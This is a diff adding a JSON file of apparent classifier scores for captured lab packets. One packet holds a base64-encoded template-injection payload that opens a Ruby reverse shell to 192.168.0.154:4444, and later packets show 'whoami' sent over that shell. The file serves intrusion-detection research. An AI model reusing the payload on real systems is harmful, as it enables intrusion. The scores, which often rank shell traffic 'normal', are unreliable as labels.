@@ -1,0 +1,227 @@
+[
+    {
+        "sequence": "\n    Packet: 0\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=60 id=61072 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc9c7 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=38065 dport=3500 seq=921847721 ack=0 dataofs=10 reserved=0 flags=S window=64240 chksum=0x8292 urgptr=0 options=[('MSS', 1460), ('SAckOK', b''), ('Timestamp', (976439997, 0)), ('NOP', None), ('WScale', 7)] |>>\n    ",
+        "labels": [
+            "normal",
+            "attack",
+            "malicious",
+            "not-malicious"
+        ],
+        "scores": [
+            0.3399449586868286,
+            0.32897013425827026,
+            0.2001233696937561,
+            0.1309615969657898
+        ]
+    },
+    {
+        "sequence": "\n    Packet: 1\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=61073 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc9ce src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=38065 dport=3500 seq=921847722 ack=2922445205 dataofs=8 reserved=0 flags=A window=502 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (976439997, 6373015))] |>>\n    ",
+        "labels": [
+            "normal",
+            "attack",
+            "malicious",
+            "not-malicious"
+        ],
+        "scores": [
+            0.4460219740867615,
+            0.27363452315330505,
+            0.16338732838630676,
+            0.1169561818242073
+        ]
+    },
+    {
+        "sequence": "\n    As the payload is large, we will split the payload into 2 parts.\n    Here is part 1 of the payload,Do not provide explanation, Only respond if its Malicious or Not-Malicious.:\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=1029 id=61074 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc5fc src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=38065 dport=3500 seq=921847722 ack=2922445205 dataofs=8 reserved=0 flags=PA window=502 chksum=0x865b urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (976439998, 6373015))] |<Raw  load='GET /readme HTTP/1.1\\r\\nHost: 192.168.0.121:3500\\r\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13.1; rv:108.0) Gecko/20100101 Firefox/108.0\\r\\nAccept: application/json\\r\\nContent-Type: application/json\\r\\nContent-Length: 751\\r\\n\\r\\n{\"os\":{\"inline\":\"\\\\u003c%= eval(%[Y29kZSA9ICUoY21WeGRXbHlaU0FuYzI5amEyVjBKenRqUFZSRFVGTnZZMnRsZEM1dVpYY29JakU1TWk0eE5qZ3VNQzR4TlRRaUxDQTBORFEwS1Rza2MzUmthVzR1Y21WdmNHVnVLR01wT3lSemRHUnZkWFF1Y21WdmNHVnVLR01wT3lSemRHUmxj\n    Packet: 2\n    ",
+        "labels": [
+            "malicious",
+            "not-malicious",
+            "attack",
+            "normal"
+        ],
+        "scores": [
+            0.3781241178512573,
+            0.24595589935779572,
+            0.20705150067806244,
+            0.16886846721172333
+        ]
+    },
+    {
+        "sequence": "\n    As the payload is large, we will split the payload into 2 parts.\n    Here is part 2 of the payload,Do not provide explanation, Only respond if its Malicious or Not-Malicious.:\n    Protocol: IP\n    Payload: bkl1Y21WdmNHVnVLR01wT3lSemRHUnBiaTVsWVdOb1gyeHBibVY3Zkd4OGJEMXNMbk4wY21sd08yNWxlSFFnYVdZZ2JDNXNaVzVuZEdnOVBUQTdLRWxQTG5CdmNHVnVLR3dzSW5KaUlpbDdmR1prZkNCbVpDNWxZV05vWDJ4cGJtVWdlM3h2ZkNCakxuQjFkSE1vYnk1emRISnBjQ2tnZlgwcElISmxjMk4xWlNCdWFXd2dmUT09KS51bnBhY2soJShtMCkpLmZpcnN0CmlmIFJVQllfUExBVEZPUk0gPX4gL21zd2lufG1pbmd3fHdpbjMyLwppbnAgPSBJTy5wb3BlbiglKHJ1YnkpLCAlKHdiKSkgcmVzY3VlIG5pbAppZiBpbnAKaW5wLndyaXRlKGNvZGUpCmlucC5jbG9zZQplbmQKZWxzZQppZiAhIFByb2Nlc3MuZm9yaygpCmV2YWwoY29kZSkgcmVzY3VlIG5pbAplbmQKZW5k].unpack(%[m0])[0]) %\\\\u003e\"}}' |>>>\n    Packet: 2\n    ",
+        "labels": [
+            "attack",
+            "malicious",
+            "not-malicious",
+            "normal"
+        ],
+        "scores": [
+            0.4290883243083954,
+            0.3522721529006958,
+            0.10938774794340134,
+            0.10925179719924927
+        ]
+    },
+    {
+        "sequence": "\n    All the parts of the payload in the packet are provided, please analyze them as a whole\n    and categorize whether they are malicious or not. Do not provide explanation, Only respond if its Malicious or Not-Malicious.\n    ",
+        "labels": [
+            "attack",
+            "malicious",
+            "not-malicious",
+            "normal"
+        ],
+        "scores": [
+            0.3544660806655884,
+            0.23175254464149475,
+            0.22580334544181824,
+            0.18797807395458221
+        ]
+    },
+    {
+        "sequence": "\n    Packet: 3\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=60 id=0 flags=DF frag=0 ttl=64 proto=tcp chksum=0xb858 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=4444 dport=44322 seq=1428358441 ack=1758083603 dataofs=10 reserved=0 flags=SA window=65160 chksum=0x8292 urgptr=0 options=[('MSS', 1460), ('SAckOK', b''), ('Timestamp', (976440047, 6373027)), ('NOP', None), ('WScale', 7)] |>>\n    ",
+        "labels": [
+            "normal",
+            "attack",
+            "malicious",
+            "not-malicious"
+        ],
+        "scores": [
+            0.39353421330451965,
+            0.34248092770576477,
+            0.18132679164409637,
+            0.0826580822467804
+        ]
+    },
+    {
+        "sequence": "\n    Packet: 4\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=61075 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc9cc src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=38065 dport=3500 seq=921848699 ack=2922445592 dataofs=8 reserved=0 flags=A window=501 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (976440057, 6373029))] |>>\n    ",
+        "labels": [
+            "normal",
+            "attack",
+            "malicious",
+            "not-malicious"
+        ],
+        "scores": [
+            0.44547489285469055,
+            0.29819878935813904,
+            0.15559838712215424,
+            0.10072788596153259
+        ]
+    },
+    {
+        "sequence": "\n    Packet: 5\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=61076 flags=DF frag=0 ttl=64 proto=tcp chksum=0xc9cb src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=38065 dport=3500 seq=921848699 ack=2922445592 dataofs=8 reserved=0 flags=FA window=501 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (976440062, 6373029))] |>>\n    ",
+        "labels": [
+            "normal",
+            "attack",
+            "malicious",
+            "not-malicious"
+        ],
+        "scores": [
+            0.39807766675949097,
+            0.3393367528915405,
+            0.16102853417396545,
+            0.10155705362558365
+        ]
+    },
+    {
+        "sequence": "\n    Packet: 6\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=77 id=2504 flags=DF frag=0 ttl=64 proto=tcp chksum=0xae7f src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=4444 dport=44322 seq=1428358442 ack=1758083603 dataofs=8 reserved=0 flags=PA window=510 chksum=0x82a3 urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (976441099, 6373027))] |<Raw  load='echo HY9xRiwz48WwvEA7ZqK\\n' |>>>\n    ",
+        "labels": [
+            "normal",
+            "attack",
+            "malicious",
+            "not-malicious"
+        ],
+        "scores": [
+            0.3508337736129761,
+            0.34173718094825745,
+            0.21219193935394287,
+            0.09523701667785645
+        ]
+    },
+    {
+        "sequence": "\n    Packet: 7\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=2505 flags=DF frag=0 ttl=64 proto=tcp chksum=0xae97 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=4444 dport=44322 seq=1428358467 ack=1758083622 dataofs=8 reserved=0 flags=A window=510 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (976441101, 6373291))] |>>\n    ",
+        "labels": [
+            "normal",
+            "attack",
+            "malicious",
+            "not-malicious"
+        ],
+        "scores": [
+            0.41313907504081726,
+            0.3194398283958435,
+            0.1653803586959839,
+            0.10204067826271057
+        ]
+    },
+    {
+        "sequence": "\n    Packet: 8\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=2506 flags=DF frag=0 ttl=64 proto=tcp chksum=0xae96 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=4444 dport=44322 seq=1428358467 ack=1758083623 dataofs=8 reserved=0 flags=A window=510 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (976441102, 6373291))] |>>\n    ",
+        "labels": [
+            "normal",
+            "attack",
+            "malicious",
+            "not-malicious"
+        ],
+        "scores": [
+            0.3670673668384552,
+            0.34170523285865784,
+            0.18031112849712372,
+            0.11091624945402145
+        ]
+    },
+    {
+        "sequence": "\n    Packet: 9\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=53 id=2507 flags=DF frag=0 ttl=64 proto=tcp chksum=0xae94 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=4444 dport=44322 seq=1428358467 ack=1758083623 dataofs=8 reserved=0 flags=PA window=510 chksum=0x828b urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (976446512, 6373291))] |<Raw  load='\\n' |>>>\n    ",
+        "labels": [
+            "normal",
+            "attack",
+            "malicious",
+            "not-malicious"
+        ],
+        "scores": [
+            0.35168367624282837,
+            0.305987685918808,
+            0.22296591103076935,
+            0.11936269700527191
+        ]
+    },
+    {
+        "sequence": "\n    Packet: 10\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=59 id=2508 flags=DF frag=0 ttl=64 proto=tcp chksum=0xae8d src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=4444 dport=44322 seq=1428358468 ack=1758083623 dataofs=8 reserved=0 flags=PA window=510 chksum=0x8291 urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (976458031, 6374653))] |<Raw  load='whoami\\n' |>>>\n    ",
+        "labels": [
+            "normal",
+            "attack",
+            "malicious",
+            "not-malicious"
+        ],
+        "scores": [
+            0.40372467041015625,
+            0.29923883080482483,
+            0.19458140432834625,
+            0.10245509445667267
+        ]
+    },
+    {
+        "sequence": "\n    Packet: 11\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=2509 flags=DF frag=0 ttl=64 proto=tcp chksum=0xae93 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=4444 dport=44322 seq=1428358475 ack=1758083632 dataofs=8 reserved=0 flags=A window=510 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (976458034, 6377524))] |>>\n    ",
+        "labels": [
+            "normal",
+            "attack",
+            "malicious",
+            "not-malicious"
+        ],
+        "scores": [
+            0.389860600233078,
+            0.3328266143798828,
+            0.16679388284683228,
+            0.11051898449659348
+        ]
+    },
+    {
+        "sequence": "\n    Packet: 12\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=2510 flags=DF frag=0 ttl=64 proto=tcp chksum=0xae92 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=4444 dport=44322 seq=1428358475 ack=1758083633 dataofs=8 reserved=0 flags=A window=510 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (976458035, 6377524))] |>>\n    ",
+        "labels": [
+            "normal",
+            "attack",
+            "malicious",
+            "not-malicious"
+        ],
+        "scores": [
+            0.38858452439308167,
+            0.3391214907169342,
+            0.1663193255662918,
+            0.10597465187311172
+        ]
+    }
+]
